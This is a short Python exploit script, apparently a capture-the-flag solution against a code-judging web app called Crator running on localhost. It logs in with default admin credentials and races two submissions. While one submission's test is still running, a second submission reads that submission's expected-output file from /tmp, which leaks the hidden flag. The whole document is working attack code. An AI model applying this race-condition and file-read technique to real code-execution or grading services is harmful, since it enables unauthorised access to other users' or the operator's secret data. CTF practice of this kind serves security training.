import requests
import threading
import time

BASE_URL = "http://localhost:8000"

s = requests.Session()

print("[+] Logging in")
s.post(BASE_URL + "/login", data={"username": "admin", "password": "admin"})

print("[+] Getting base submission number")
r = s.post(BASE_URL + "/submit/helloworld", data={'code': 'print("Hello, World!")'}, allow_redirects=False)
base_submission = int(r.headers["Location"].split("/")[-1])

print("[+] Making first submission")
def submit_one():
    r = s.post(BASE_URL + "/submit/helloinput", data={'code': 'x=input()\nprint(x)\nif x!="Welcome to Crator":\n  while True:\n    pass'}, allow_redirects=False)

t = threading.Thread(target=submit_one)
t.start()

time.sleep(0.2) # wait for first test case to finish
print("[+] Making second submission")
code = f'''
with open('/tmp/{base_submission + 1}.expected', 'r') as f:
    print(f.read().strip())
'''
r = s.post(BASE_URL + "/submit/helloworld", data={'code': code})

print("[+] Flag exfiltrated (hopefully)")
flag = r.text[r.text.index("idek"):]
flag = flag[:flag.index("}") + 1]
print(flag)